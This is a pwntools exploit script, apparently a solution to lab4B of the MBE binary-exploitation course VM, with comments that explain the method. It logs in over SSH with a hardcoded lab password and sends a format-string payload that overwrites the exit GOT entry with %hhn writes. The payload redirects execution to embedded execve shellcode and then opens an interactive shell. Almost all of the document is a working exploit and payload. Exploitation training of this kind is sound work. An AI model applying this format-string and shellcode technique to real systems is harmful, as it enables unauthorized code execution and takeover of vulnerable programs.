# Solved by leaking stack address with %p%p%p%p comparing with the leaked one in gdb and calculating offset.
# And the rest is simply a normal format string
# aaaabaaacaaa%{number}$p increase {number} until you find the cyclic pattern
# build payload with addresses_to_overwrite + %{byte_value-16}c%{number}hhn [repeat for every address]
# In this case we overwrote GOT of exit function to a pointer to our shellcode
# This remote code doesn't work I solved it locally printing to file and doing (cat file;cat)| ./binary

from pwn import *# pylint: disable=unused-wildcard-import
# pylint: disable=undefined-variable
# pylint: disable=no-member
context.log_level = 'debug'# pylint: disable=assigning-non-slot

ssh = ssh("lab4B","mbe.vm",password="bu7_1t_w4sn7_brUt3_f0rc34b1e!")

#0x80499b8
#payload = ""
#0xbffff677
exit_plt = p32(0x80499b8)+p32(0x80499b8+1)+p32(0x80499b8+2)+p32(0x80499b8+3)
frmt = "%103c%6$hhn%127c%7$hhn%9c%8$hhn%192c%9$hhn"
shellcode = "\x90"*10+"\xBB\x24\x3A\xF8\xB7\x31\xC0\x89\xC1\x89\xC2\xB0\x0B\xCD\x80"
payload = exit_plt + frmt + shellcode


p = ssh.process("/levels/lab04/lab4B")
p.sendline(payload)

p.interactive()
ssh.close()